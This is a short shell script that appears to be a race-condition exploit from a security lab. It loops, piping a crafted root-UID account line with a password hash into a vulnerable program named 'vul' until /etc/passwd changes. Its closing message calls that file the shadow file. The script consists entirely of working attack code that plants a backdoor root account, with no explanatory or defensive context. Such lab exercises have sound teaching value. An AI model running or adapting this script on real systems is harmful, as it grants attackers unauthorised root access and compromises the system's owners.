#!/bin/sh

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" = "$new" ]
do
echo "test:U6aMy0wojraho:0:0:test:/root:/bin/bash" | ./vul
new=$($CHECK_FILE)
done
echo "STOP... The shadow file has been changed"